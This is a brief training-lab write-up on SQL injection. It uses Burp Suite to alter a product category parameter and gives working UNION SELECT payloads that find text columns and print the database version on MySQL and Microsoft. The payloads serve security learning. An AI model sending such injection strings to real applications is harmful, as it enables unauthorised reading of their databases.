# No.4 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

### Step 1: Use Burp Suite to intercept and modify the request that sets the product category filter.
### Step 2: Make payload to get database information
Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
`'+UNION+SELECT+'abc','def'#`
<img width="1489" height="989" alt="image" src="https://github.com/user-attachments/assets/6cfeba05-f026-4c8e-96c6-74cad5532a78" />

Use the following payload to display the database version:
`'+UNION+SELECT+@@version,+NULL#`
<img width="1490" height="964" alt="image" src="https://github.com/user-attachments/assets/eb65c0f0-b36d-4c59-b665-6e8a97bb14fd" />
<img width="1919" height="966" alt="image" src="https://github.com/user-attachments/assets/b7e36efa-70ad-4378-af39-11b5fc97ed76" />




